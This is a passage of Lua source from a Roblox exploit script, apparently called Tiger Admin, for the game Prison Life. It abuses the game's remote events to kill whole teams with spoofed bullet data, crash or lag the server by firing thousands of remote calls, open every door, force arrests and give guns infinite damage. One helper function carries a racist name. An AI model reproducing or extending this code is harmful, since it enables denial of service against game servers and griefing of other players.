			API:ChangeTeam(game.Teams.Criminals,true)
		end
		API:GetGun("Remington 870")
		local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
		repeat API:swait() Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun

		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v and v~=Player  and v.Team == game.Teams.Inmates or v.Team == game.Teams.Guards and not table.find(API.Whitelisted,v)  then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
		API:ChangeTeam(game.Teams.Inmates,true)
		API:GetGun("Remington 870")
		repeat API:swait() Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870") until Gun
		local Gun = Player.Backpack:FindFirstChild("Remington 870") or Player.Character:FindFirstChild("Remington 870")
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v and v~=Player and not table.find(API.Whitelisted,v) then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
		if LastTeam ~= game.Teams.Inmates then
			API:ChangeTeam(LastTeam,true)
		end
	elseif TeamToKill then
		if TeamToKill == game.Teams.Inmates or TeamToKill == game.Teams.Guards  then
			if Player.Team ~= game.Teams.Criminals then
				API:ChangeTeam(game.Teams.Criminals)
			end
		elseif TeamToKill == game.Teams.Criminals then
			if Player.Team ~= game.Teams.Inmates then
				API:ChangeTeam(game.Teams.Inmates)
			end
		end
		local BulletTable = {}
		for i,v in pairs(TeamToKill:GetPlayers()) do
			if v and v~=Player and  not table.find(API.Whitelisted,v) then
				for i =1,15 do
					BulletTable[#BulletTable + 1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Hit"] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part"),
					}
				end
			end
		end
		wait(.4)
		API:GetGun("M9")
		local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9")
		repeat task.wait() Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") until Gun

		task.spawn(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(BulletTable, Gun)
		end)
	end
end
function API:GuardsFull(a)
	if #game:GetService("Teams").Guards:GetPlayers()==8 then
		if a then
			if Player.Team == game.Teams.Guards then
				return false
			end
		end
		return false
	end
	return true
end
function API:AllGuns()
	local saved = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
	if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651) then
		API:GetGun("M4A1", true)
	end
	API:GetGun("AK-47", true)
	task.spawn(function()
		API:GetGun("Remington 870", true)
	end)
	API:GetGun("M9", true)
	game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(saved)
end
function API:GetHumanoid()
	return plr.Character:FindFirstChildOfClass("Humanoid")
end

function API:touch(Toucher, TouchThis)
	if not Toucher or not TouchThis then
		return
	end
	task.spawn(function()
		firetouchinterest(Toucher, TouchThis, 0)
		firetouchinterest(Toucher, TouchThis, 1)
	end)
end
function AntiPunchC(v2)
	if States.antipunch == false then
		return
	end
	pcall(function()
		if v2 == plr then
			return
		end
		v2.Character:FindFirstChildOfClass("Humanoid").AnimationPlayed:Connect(function(animationTrack)
			pcall(function()
				if not Unloaded and States.antipunch then
					if animationTrack.Animation.AnimationId == "rbxassetid://484200742" or animationTrack.Animation.AnimationId =="rbxassetid://484926359" then
						if (plr.Character.HumanoidRootPart.Position-v2.Character.HumanoidRootPart.Position).magnitude <3.5 and States.antipunch and not table.find(API.Whitelisted,v2) then
							for i =1,13 do
								task.spawn(function()
									game.ReplicatedStorage["meleeEvent"]:FireServer(v2)
								end)
							end
						end
					end
				end
			end)
		end)
	end)
end
local Flying = false
function API:Fly(speed)
	Flying = true
	local Controler = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild('PlayerModule'):WaitForChild("ControlModule"))
	local BodyA,BodyB = Instance.new("BodyVelocity"),Instance.new("BodyGyro")
	BodyA.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
	BodyA.MaxForce = Vector3.new(0,0,0)
	BodyA.Velocity = Vector3.new(0,0,0)
	BodyB.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
	BodyB.MaxTorque = Vector3.new(4^234,4^234,4^234)
	BodyB.P = 10000
	BodyB.D = 50
	Temp.FlyA = BodyA
	Temp.FlyB = BodyB
	local camera = game.Workspace.CurrentCamera
	Temp.FlyConnection = game:GetService"RunService".RenderStepped:Connect(function()
		if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health >0 and BodyA and BodyB then
			local direction = Controler:GetMoveVector()
			BodyA.MaxForce = Vector3.new(4^234,4^234,4^234)
			BodyB.MaxTorque = Vector3.new(4^234,4^234,4^234)
			BodyB.CFrame = camera.CoordinateFrame
			BodyA.Velocity = Vector3.new()
			if direction.X > 0 then
				BodyA.Velocity = BodyA.Velocity + camera.CFrame.RightVector*(direction.X*(speed*10))
			end
			if direction.X < 0 then
				BodyA.Velocity = BodyA.Velocity + camera.CFrame.RightVector*(direction.X*(speed*10))
			end
			if direction.Z > 0 then
				BodyA.Velocity = BodyA.Velocity - camera.CFrame.LookVector*(direction.Z*(speed*10))
			end
			if direction.Z < 0 then
				BodyA.Velocity = BodyA.Velocity - camera.CFrame.LookVector*(direction.Z*(speed*10))
			end
		end
	end)
end
function API:Unfly()
	if Flying then
		Flying = false
		API:Destroy(Temp.FlyA)
		API:Destroy(Temp.FlyB)
		Temp.FlyConnection:Disconnect()
		API:Refresh(true)
	end
end
function API:lag()
	API:Notif("Lagging the server...")
	local Bullets = API:CreateBulletTable(10, nil, true)
	if API:GuardsFull() then
		API:GetGun("M9")
	else
		API:ChangeTeam(game.Teams.Guards)
	end
	repeat
		task.wait()
	until Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
	game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9"))
	for i = 1,40 do
		local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
		if not Gun or not API:GetHumanoid() or API:GetHumanoid() and API:GetHumanoid().Health < 1  then
			task.wait(4)--//Ping cool down
			API:lag()
			break
		end
		coroutine.wrap(function()
			game:GetService("ReplicatedStorage").ShootEvent:FireServer({}, Gun)
		end)()
		coroutine.wrap(function()
			game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Gun)
		end)()
	end
end

function API:CrashServer()
	if not PremiumActivated then
		return
	end
	API:Notif("Attempting to crash the server...")
	local Bullets = API:CreateBulletTable(40, nil, true)
	if API:GuardsFull() then
		API:GetGun("M9")
	else
		API:ChangeTeam(game.Teams.Guards)
	end
	repeat
		task.wait()
	until Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
	game:GetService("ReplicatedStorage").ReloadEvent:FireServer(Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9"))
	local Gun = Player.Backpack:FindFirstChild("M9") or Player.Character:FindFirstChild("M9") 
	task.spawn(function()
		for i = 1,5000 do
			game:GetService("ReplicatedStorage").ShootEvent:FireServer({}, Gun)
		end
	end)
	while wait() do
		if not Gun or not API:GetHumanoid() or API:GetHumanoid() and API:GetHumanoid().Health < 1  then
			task.wait(5)--//Ping cool down
			API:CrashServer()
			break
		end
	end
end
function API:Destroy(v)
	v:Destroy()
	pcall(function()
		v:Remove()
	end)
end
function API:BadArea(Player)
	local mod = require(game.ReplicatedStorage["Modules_client"]["RegionModule_client"])
	local a = pcall(function()
		if mod.findRegion(Player.Character) then
			mod = mod.findRegion(Player.Character)["Name"]
		end
	end)
	if not a then
		return
	end
	for i, v in pairs(game:GetService("ReplicatedStorage").PermittedRegions:GetChildren()) do
		if v and mod == v.Value then
			return false
		end
	end
	return true
end


plr.CharacterAdded:Connect(function(NewCharacter)
	if Unloaded then
		return
	end
	task.spawn(function()
		if States.AutoItems then
			wait(.5)
			API:AllGuns()
		end
	end)
	repeat API:swait() until NewCharacter
	NewCharacter:WaitForChild("HumanoidRootPart")
	NewCharacter:WaitForChild("Head")
	NewCharacter:WaitForChild("Humanoid").BreakJointsOnDeath = not States.AutoRespawn
	NewCharacter:WaitForChild("Humanoid").Died:Connect(function()
		if not Unloaded and States.AutoRespawn == true then
			API:Refresh()
			task.spawn(function()
				if States.AutoItems then
					wait(.5)
					API:AllGuns()
				end
			end)
		end
	end)
	if Temp.ArrestOldP and States.AntiArrest then
		coroutine.wrap(function()
			API:MoveTo(Temp.ArrestOldP)
			Temp.ArrestOldP = nil
		end)()
	end
	task.spawn(function()
		if States.AntiArrest then
			plr.Character:FindFirstChild("Head").ChildAdded:Connect(function(a)
				if not Unloaded then
					if a and a:IsA("BillboardGui") and States.AntiArrest then
						API:Refresh()
						coroutine.wrap(function()
							wait(1)
							Temp.ArrestOldP = API:GetPosition()
						end)()
					end
				end
			end)
		end
	end)
	if States.AntiTase then
		for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
			v:Disable()
		end
	end
end)
API:Refresh(true)
local Killcool1 = false
plr:GetMouse().Button1Up:Connect(function()
	local Target = plr:GetMouse().Target
	if Killcool1 then return end
	if States.ClickArrest or States.ClickKill then
		if Target and Target.Parent and Target.Parent:FindFirstChildOfClass("Humanoid") and game:GetService("Players"):FindFirstChild(Target.Parent.Name) or game:GetService("Players"):FindFirstChild(Target.Parent.Parent.Name) then
			local TargetModelPlr = game:GetService("Players"):FindFirstChild(Target.Parent.Name) or game:GetService("Players"):FindFirstChild(Target.Parent.Parent.Name)
			if States.ClickArrest then
				if TargetModelPlr.Team ~= game:GetService("Teams").Guards then
					local ohInstance1 = Target
					workspace.Remote.arrest:InvokeServer(ohInstance1)
				end
			end
			if States.ClickKill then
				API:KillPlayer(TargetModelPlr)
				Killcool1 = true
				wait(.6)
				Killcool1 = false
			end
		end
	end
end)
local ChangeState = function(Type,StateType)
	local Value = nil
	if Type and typeof(Type):lower() == "string" and (Type):lower() == "on" then
		Value = true
	elseif Type and typeof(Type):lower() == "string" and (Type):lower() == "off" then
		Value = false
	elseif typeof(Type):lower() == "boolean" then
		Value = Type
	else
		Value = not States[StateType]
	end
	States[StateType] = Value
	API:Notif(StateType.." has been changed to "..tostring(Value))
	return Value
end
do
	if PremiumActivated then
		API:CreateCmd("removecars", "deletes all cars that are not seated", function(args)
			local Old = API:GetPosition()
			for i,v in pairs(game:GetService("Workspace").CarContainer:GetChildren()) do
				if v then
					repeat task.wait() until Player.Character:FindFirstChildOfClass("Humanoid").Health >1

					local car = v
					if car:FindFirstChild("RWD")and  car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat").Occupant == nil then
						local Seat = car.Body.VehicleSeat
						car.PrimaryPart = car.RWD
						repeat wait()
							Seat:Sit(Player.Character:FindFirstChildOfClass("Humanoid"))
						until Player.Character:FindFirstChildOfClass("Humanoid").Sit == true
						for i =1,5 do
							wait()
							car:SetPrimaryPartCFrame(CFrame.new(3^5,workspace.FallenPartsDestroyHeight+5,23453225))
						end
						wait(.1)
						API:UnSit()
					end
				end
			end
			API:MoveTo(Old)
		end,nil,nil,true)
		API:CreateCmd("lag", "lags the server", function(args)
			API:lag()
		end,nil,nil,true)
		API:CreateCmd("kick", "!KICKS TIGER ADMIN USERS ONLY! SAY IN CHAT", function(args)
		end,nil,"[TIGER ADMIN USER]",true)
		API:CreateCmd("prefix", "Sets a different prefix", function(args)
			local New = args[2]
			if New and tostring(New) then
				local Prefixn = tostring(New)
				Settings.Prefix = Prefixn
				API:Notif("prefix set to "..New)
			else
				API:Notif("no prefix selected?",false)
			end
		end,nil,"[NEW PREFIX]",true)
		API:CreateCmd("unadmin", "Unadmins a player", function(args)
			local Target = API:FindPlayer(args[2])
			if Target then
				if table.find(Temp.Admins,Target.Name) then
					table.remove(Temp.Admins,table.find(Temp.Admins,Target.Name))
				else
					API:Notif("This player is not an admin!",false)
				end
			end
		end,nil,nil,true)
		API:CreateCmd("pp", "sus", function(args)
			API:AllGuns()
			wait(1)
			for i,v in pairs(Player.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = Player.Backpack
				end
			end
			Player.Backpack.M9.Parent = Player.Character
			Player.Backpack["AK-47"].Parent = Player.Character
			Player.Backpack["Remington 870"].Parent = Player.Character
			wait()
			Player.Character.M9.GripPos = Vector3.new(0.9, 2, 0)
			Player.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 2.1)
			Player.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 6.4)
			wait()
			for i,v in pairs(Player.Character:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = Player.Backpack
				end
			end
			wait()
			Player.Backpack.M9.Parent = Player.Character
			Player.Backpack["AK-47"].Parent = Player.Character
			Player.Backpack["Remington 870"].Parent = Player.Character
		end,nil,nil,true)
		API:CreateCmd("jeff", "Jeff the killer npc (rejoin to disable)", function(args)
			task.spawn(function()
				local player = game.Players.LocalPlayer
				local anim = nil
				local anim2  = nil
				function blackpeople()
					repeat
						wait()
						workspace.Remote.ItemHandler:InvokeServer({Position=player.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
					until player.Backpack:FindFirstChild("Crude Knife")
					local crude = player.Backpack:WaitForChild("Crude Knife")
					crude.Parent = player.Character
					local anim = Instance.new("Animation")
					local anim2 = anim:Clone()
					anim.AnimationId = "rbxassetid://252557606"
					anim2.AnimationId = crude:WaitForChild("Handle"):WaitForChild("Animation").AnimationId
					anim = player.Character.Humanoid:LoadAnimation(anim)
					anim2 = player.Character.Humanoid:LoadAnimation(anim2)
					anim:Play()
					anim.Looped = true
				end
				blackpeople()
				player.CharacterAdded:Connect(function(a)
					a:WaitForChild("HumanoidRootPart")
					blackpeople()
				end)
				task.spawn(function()
					local function findNearestPlayer(Position)
						wait(0.3)
						local List = game.Workspace:children()
						local Torso = nil
						local Distance = 30
						local Temp = nil
						local Human = nil
						local Temp2 = nil
						for x = 1, #List do
							Temp2 = List[x]
							if (Temp2.className == "Model") and (Temp2 ~= player.Character) then
								Temp = Temp2:findFirstChild("HumanoidRootPart")
								Human = Temp2:findFirstChild("Humanoid")
								if (Temp ~= nil) and (Human ~= nil) and (Human.Health > 0) then
									if (Temp.Position - Position).magnitude < Distance then
										Torso = Temp
										Distance = (Temp.Position - Position).magnitude
									end
								end
							end
						end
						return Torso
					end
					task.spawn(function()
						while wait(math.random(3,5)) do
							pcall(function()
								player.Character:FindFirstChildOfClass("Humanoid").Jump = true
							end)
						end
					end)
					while true do
						task.wait()
						pcall(function()
							game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, true)
							player.Character.Humanoid.WalkSpeed = 25
							local target = findNearestPlayer(player.Character.HumanoidRootPart.Position)
							if target ~= nil then
								player.Character.Humanoid:MoveTo(target.Position, target)
								if (target.Position - player.Character.Head.Position).magnitude < 5 then
									if anim2 then
										anim2:Play()
										anim2.Priority = Enum.AnimationPriority.Action4
									end
									for i = 1,3 do game.ReplicatedStorage.meleeEvent:FireServer(game.Players[target.Parent.Name]) end
								end
							else
								wait(math.random(2,3))
								local new = player.Character:GetPrimaryPartCFrame()
								new = new *CFrame.new(math.random(4,17),0,math.random(4,24)).Position
								player.Character.Humanoid:MoveTo(new)
							end
						end)
					end
				end)
			end)
		end,nil,nil,true)
		API:CreateCmd("opendoors", "Opens every single door", function(args)
			if not firetouchinterest then
				return API:Notif("Your exploit doesnt support this command!",false)
			end
			local LastTeam =plr.Team
			API:ChangeTeam(game.Teams.Guards)
			wait(.7)
			task.spawn(function()
				local Arg_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"]
				local Event = game:GetService("Workspace").Remote.ItemHandler
				Event:InvokeServer(Arg_1)
			end)
			for i,v in pairs(game:GetService("Workspace").Doors:GetChildren()) do
				if v then
					if v:FindFirstChild("block") and v:FindFirstChild("block"):FindFirstChild("hitbox") then
						firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,0)
						firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,1)
					end
				end
			end
			wait(1)
			API:ChangeTeam(LastTeam)
		end,nil,nil,true)
		API:CreateCmd("loopopendoors", "Opens every single door on loop", function(args)
			local value = ChangeState(args[2],"loopopendoors")
			if value then
				while wait(2.4) do
					if not States.loopopendoors then
						break
					end
					if not firetouchinterest then
						return API:Notif("Your exploit doesnt support this command!",false)
					end
					local LastTeam =plr.Team
					API:ChangeTeam(game.Teams.Guards)
					wait(.7)
					task.spawn(function()
						local Arg_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"]
						local Event = game:GetService("Workspace").Remote.ItemHandler
						Event:InvokeServer(Arg_1)
					end)
					for i,v in pairs(game:GetService("Workspace").Doors:GetChildren()) do
						if v then
							if v:FindFirstChild("block") and v:FindFirstChild("block"):FindFirstChild("hitbox") then
								if not States.loopopendoors then
									break
								end
								firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,0)
								firetouchinterest(Player.Character.HumanoidRootPart,v.block.hitbox,1)
							end
						end
					end
					if not States.loopopendoors then
						break
					end
					wait(1)
					API:ChangeTeam(LastTeam)
				end
			end
		end,nil,nil,true)

		API:CreateCmd("grabknife", "Cool script [REJOIN TO STOP]", function(args)
			task.spawn(function()
				workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
				repeat task.wait() until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crude Knife")
				game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crude Knife").Parent = game:GetService("Players").LocalPlayer.Character
				local Player = game:GetService("Players").LocalPlayer
				local Character = Player.Character
				local Crude = Player.Backpack:FindFirstChild("Crude Knife") or Player.Character:FindFirstChild("Crude Knife")
				local OldPosition = Crude.Grip
				local PlayingAnimations = {}
				local Target = nil
				Player.CharacterAdded:Connect(function(a)
					a:WaitForChild("Humanoid")
					Character = a
					wait(.7)
					workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
					repeat task.wait() until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crude Knife")
					game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Crude Knife").Parent = game:GetService("Players").LocalPlayer.Character
					Crude= Player.Backpack:FindFirstChild("Crude Knife") or Player.Character:FindFirstChild("Crude Knife")
					Crude.Equipped:connect(function()
						task.wait(0.4)
						for _,Animation in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
							if string.find(Animation.Animation.AnimationId, "182393478") then
								Animation:Stop()
							end
						end
					end)
				end)
				local Mouse = Player:GetMouse()
				local function StopAnimations()
					for i,v in pairs(PlayingAnimations) do
						if v then
							v:Stop()
						end
					end
				end
				local function SetPos(New,New2,IsSlashing)
					Crude.Parent = Player.Backpack
					Crude.Grip = New2
					Crude.Grip *= New
					Crude.Parent = Player.Character
					if IsSlashing then
						task.spawn(function()
							game:GetService("ReplicatedStorage").meleeEvent:FireServer(Target)
						end)
					end
				end
				local function Idle()
					StopAnimations()
					Crude.Parent = Player.Backpack
					Crude.Grip = OldPosition
					Crude.Parent = Player.Character
				end
				Crude.Equipped:connect(function()
					task.wait(0.4)
					for _,Animation in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
						if string.find(Animation.Animation.AnimationId, "182393478") then
							Animation:Stop()
						end
					end
				end)
				local function Holding()
					local a = Instance.new("Animation")
					a.AnimationId = "rbxassetid://175676962"
					a = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(a)
					a:Play()
					a:AdjustSpeed(0)
					table.insert(PlayingAnimations, a)
					SetPos(CFrame.new(1.4,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
				end
				local function Slash()
					StopAnimations()
					local a = Instance.new("Animation")
					a.AnimationId = "rbxassetid://175676962"
					a = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(a)
					a:Play()
					a:AdjustSpeed(0)
					table.insert(PlayingAnimations, a)
					SetPos(CFrame.new(1.4,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(1.3,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(1.2,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(1.1,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(1,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(0.9,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0.8,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(0.7,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0.6,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(0.5,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0.4,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0.3,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(0.1,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(0,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.1,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.2,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(-.3,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.4,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)))
					task.wait()
					SetPos(CFrame.new(-.5,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.6,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.7,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					SetPos(CFrame.new(-.8,-2.1,0.5),CFrame.new(1.5,0,0)*CFrame.Angles(0, 0, math.rad(-90)),true)
					task.wait()
					wait(.5)
					StopAnimations()
					Idle()
				end
				Mouse.Button1Up:Connect(function()
					if not Target then
						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
							if v and v~=Player then
								if (Character:GetPrimaryPartCFrame().Position-v.Character:GetPrimaryPartCFrame().Position).Magnitude <10 and v.Character:FindFirstChildOfClass("Humanoid").Health>1 then
									if not Target then
										Target = v
										Holding()
										break
									end
								end
							end
						end
					end
				end)
				game:GetService("RunService").Stepped:Connect(function()
					if Target and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health>1 then
						Character:SetPrimaryPartCFrame(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,1.1))
					end
				end)
				game:GetService("UserInputService").InputEnded:Connect(function(a,b)
					if not b then
						if a.KeyCode == Enum.KeyCode.E and Target then
							Slash()
							wait(.5)
							Target = nil
						end
					end
				end)
			end)
		end,nil,nil,true)
		API:CreateCmd("admin", "The selected player can use certain commands", function(args)
			local Target = API:FindPlayer(args[2])
			if Target then
				if not table.find(Temp.Admins,Target.Name) then
					table.insert(Temp.Admins, Target.Name)
					local ohString1 = "/w "..Target.Name.." ".."ADMIN: You have been admined! if you are ready to get started using commands type [!cmds] in chat."
					local ohString2 = "All"
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
				else
					API:Notif("This player is already an admin!",false)
				end
			end
		end,nil,nil,true)
		API:CreateCmd("admins", "Tells you all admins", function(args)
			local Compiled = ""
			for i,v in pairs(Temp.Admins) do
				if v then
					Compiled=Compiled..string.char(32)..v
				end
			end
			API:Notif("Admins: "..Compiled,4)
		end,nil,nil,true)
		API:CreateCmd("crashserver", "Crashes the server", function(args)
			API:CrashServer()
		end,nil,nil,true)
		--5
		API:CreateCmd("oneshot", "Makes a gun oneshot", function(args)
			ChangeState(args[2],"OneShot")
		end,nil,"[ON/OFF]",true)
		API:CreateCmd("anticrash", "Tries to stop simple crashes (DOESNT WORK WITH TIGER ADMIN CRASH)", function(args)
			local Value = ChangeState(args[2],"anticrash")
			if Value then
				pcall(function()
					game:GetService("Players").LocalPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
				end)
			else
				pcall(function()
					game:GetService("Players").LocalPlayer.PlayerScripts.ClientGunReplicator.Disabled = false
				end)
			end
		end,nil,"[ON/OFF]",true)
		API:CreateCmd("virus", "Anyone who touches the player dies", function(args)
			local r = API:FindPlayer(args[2])
			if r and not table.find(Temp.Viruses,r) then
				table.insert(Temp.Viruses, r)
				API:Notif("Player now has covid-19")
			end
		end,nil,"[PLAYER]",true)
		API:CreateCmd("unvirus", "Removes virus from player", function(args)
			local r = API:FindPlayer(args[2])
			if r and table.find(Temp.Viruses,r) then
				table.remove(Temp.Viruses,table.find(Temp.Viruses,r))
				API:Notif("Removed covid-19 from player")
			end
		end,nil,"[PLAYER]",true)
		API:CreateCmd("lagspike", "Freezes everyones screen for some seconds", function(args)
			local a = game:GetService("RunService").Stepped:Connect(function()
				pcall(function()
					plr.Character:Destroy()
				end)
			end)
			local a2 = plr.CharacterAdded:Connect(function(a)
				pcall(function()
					a:Destroy()
				end)
				pcall(function()
					plr.Character:Destroy()
				end)
			end)
			for i =1,1500 do
				task.spawn(function()
					workspace.Remote.TeamEvent:FireServer("Bright orange")
				end)
			end
			wait(8)
			a:Disconnect()
			a2:Disconnect()
			wait(.7)
			task.spawn(function()
				workspace.Remote.TeamEvent:FireServer("Bright orange")
			end)
		end,nil,"",true)
		API:CreateCmd("ff", "Forcefield", function(args)
			local Value = ChangeState(args[2],"ff")
		end,nil,"[ON/OFF]",true)
		API:CreateCmd("minigun", "makes a minigun", function(args)
			API:GetGun("AK-47")
			wait(.7)
			local Tool = plr.Backpack:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return API:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["Damage"] = 9e9
			cc["FireRate"] = 0.001
			cc["Range"] = math.huge
			cc["MaxAmmo"] = math.huge
			cc["StoredAmmo"] = math.huge
			cc["AmmoPerClip"] = math.huge
			cc["CurrentAmmo"] = math.huge
			if Tool.Name ~= "Remington 870" then
				cc["Bullets"] = 1
				cc["AutoFire"] = true
			end
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
			API:GetGun("Remington 870")
			wait(.7)
			for i,v in pairs(plr.Backpack:GetChildren()) do
				if v and v:FindFirstChildOfClass("ModuleScript") then
					v.Grip = v.Grip+Vector3.new(0,1,0)
				end
			end
			plr.Backpack:WaitForChild("Remington 870").Parent = plr.Character
			wait(.4)
			plr.Backpack:WaitForChild("AK-47").Parent = plr.Character
		end,nil,"",true)
		API:CreateCmd("music", "plays sound id in your game", function(args)
			local r = args[2]
			if r == "stop" then
				if Temp.MUSICP then
					Temp.MUSICP:Stop()
					Temp.MUSICP:Destroy()
					Temp.MUSICP = nil
				end
			elseif tonumber(Temp.MUSICP) then
				local a = Instance.new("Sound",workspace)
				a.Volume = 1
				a.Name = "Music"
				a.Looped = true
				a:Play()
				Temp.MUSICP = a
			end
		end,nil,"[ID] OR [STOP]",true)
		API:CreateCmd("spam", "spams a message in game", function(args)
			local r = args[2]
			if tostring(r) then
				if r == "set" and args[3] then
					if not tonumber(args[3]) then
						API:Notif("invalid number!")
					else
						Temp.DelatSpam = tonumber(args[3])
					end
				else
					if r == "stop" then
						Temp.spamming = nil
					else
